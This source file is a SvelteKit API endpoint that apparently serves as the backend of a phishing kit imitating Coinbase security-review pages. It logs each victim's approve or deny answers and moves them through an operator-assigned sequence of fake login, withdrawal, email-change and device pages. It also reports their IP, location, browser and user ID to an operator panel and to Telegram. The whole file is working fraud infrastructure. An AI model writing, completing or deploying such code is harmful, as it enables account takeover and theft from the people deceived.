/**
 * Visitor "Review activity" response capture.
 *
 * Each review page (Login, Withdrawal, Email, Trust Device, Terminate Devices)
 * POSTs here when the visitor clicks Yes/No/Submit. We log the answer, advance
 * the visitor through their assigned flow (if any), and return { nextUrl } so
 * the template can navigate them to the correct next page on both panel and
 * visitor hosts.
 *
 * Public endpoint — visitor pages must be able to call it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';
import { notifyPageAction } from '$lib/server/telegram';
import { labelToUrl, labelToVisitorUrl } from '$lib/server/funnel';
import { dbSetVisitorFlowSteps } from '$lib/server/database';

const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();

const STEP_LABELS: Record<string, string> = {
	login_location: 'Sign-in location',
	withdrawal: 'Withdrawal',
	email_change: 'Email change',
	trust_device: 'Trust device',
	terminate_devices: 'Terminate devices'
};

const VERBS: Record<string, string> = {
	approve: 'approved',
	deny: 'denied',
	submit: 'submitted'
};

const STEP_PAGE_MAP: Record<string, string> = {
	login_location: 'Coinbase/Review Login',
	withdrawal: 'Coinbase/Review Withdrawal',
	email_change: 'Coinbase/Review Email',
	trust_device: 'Coinbase/Trust Device',
	terminate_devices: 'Coinbase/Terminate Devices'
};

const STEP_DEFAULT_NEXT: Record<string, string> = {
	login_location: 'Coinbase/Review Withdrawal',
	withdrawal: 'Coinbase/Review Email',
	email_change: 'Coinbase/Loading',
	trust_device: 'Coinbase/Terminate Devices',
	terminate_devices: 'Coinbase/Loading'
};

function resolveUrl(label: string, module: string, isVisitorHost: boolean, qp?: URLSearchParams): string | null {
	if (isVisitorHost) {
		return labelToVisitorUrl(label, module, qp?.size ? qp : undefined);
	}
	const base = labelToUrl(label);
	if (!base) return null;
	const qs = qp?.toString();
	return qs ? `${base}?${qs}` : base;
}

export const POST: RequestHandler = async ({ request, getClientAddress, url }) => {
	let body: { step?: string; choice?: string; detail?: string } = {};
	try {
		body = await request.json();
	} catch {
		return json({ ok: false, error: 'invalid json' }, { status: 400 });
	}

	const step = String(body.step ?? '').trim();
	const choice = String(body.choice ?? '').trim();
	const detail = String(body.detail ?? '').trim();

	if (!step || !VERBS[choice]) {
		return json({ ok: false, error: 'invalid payload' }, { status: 400 });
	}

	const ip = getClientAddress();
	const hostname = url.hostname.toLowerCase();
	const isVisitorHost = !!(PANEL_HOST && hostname !== PANEL_HOST);

	const stepLabel = STEP_LABELS[step] ?? step;
	const verb = VERBS[choice];
	const currentPageLabel = STEP_PAGE_MAP[step] || '';

	const visitor = serverState.visitors.get(ip);
	const qp = new URLSearchParams();
	if (visitor?.lastTwoDigits) qp.set('last2', visitor.lastTwoDigits);
	if (visitor?.emailFrom) qp.set('emailFrom', visitor.emailFrom);
	if (visitor?.emailTo) qp.set('emailTo', visitor.emailTo);

	let nextUrl: string | null = null;
	let nextLabel: string | null = null;
	let flowApplied = false;

	if (visitor && !visitor.flowBypassed && visitor.flowSteps?.length > 0 && currentPageLabel) {
		const stepIdx = visitor.flowSteps.findIndex(
			(s) => s.page === currentPageLabel && !s.passed
		);
		if (stepIdx !== -1) {
			visitor.flowSteps[stepIdx].passed = true;
			try { dbSetVisitorFlowSteps(ip, visitor.flowSteps); } catch {}

			const nextStep = visitor.flowSteps.find((s) => !s.passed && /^[A-Z][^/]+\/.+/.test(s.page));
			if (nextStep) {
				nextLabel = nextStep.page;
				nextUrl = resolveUrl(nextLabel, visitor.module, isVisitorHost, qp);
				if (nextUrl) {
					flowApplied = true;
					serverState.setVisitorLastPage(ip, nextLabel);
					broadcast({ type: 'visitor:updated', payload: visitor });
				}
			}
		}
	}

	if (!nextUrl) {
		nextLabel = STEP_DEFAULT_NEXT[step] || 'Coinbase/Loading';
		nextUrl = resolveUrl(nextLabel, visitor?.module || 'Coinbase', isVisitorHost, qp);
		if (nextUrl && visitor) {
			serverState.setVisitorLastPage(ip, nextLabel!);
			broadcast({ type: 'visitor:updated', payload: visitor });
		}
	}

	if (!nextUrl) {
		nextUrl = '/loading';
	}

	const flowSuffix = flowApplied ? ` → flow → ${nextLabel}` : ` → ${nextLabel}`;
	const message = `visitor ${ip} ${verb} ${stepLabel}${detail ? ` — ${detail}` : ''}${flowSuffix}`;

	const entryType: 'alert' | 'action' = choice === 'deny' ? 'alert' : 'action';
	const entry = serverState.addLogEntry(message, entryType);
	try {
		broadcast({ type: 'log:new', payload: entry });
	} catch {}

	if (visitor) {
		notifyPageAction(
			{
				ip,
				userId: visitor.userId,
				city: visitor.city,
				region: visitor.region,
				country: visitor.country,
				browser: visitor.browser,
				platform: visitor.platform,
				module: visitor.module,
				capturedBy: visitor.capturedBy,
				lastPageRoute: visitor.lastPageRoute
			},
			`Review: ${stepLabel}`,
			`${verb} — ${choice}`,
			detail || undefined
		).catch(() => {});
	}

	return json({ ok: true, nextUrl });
};
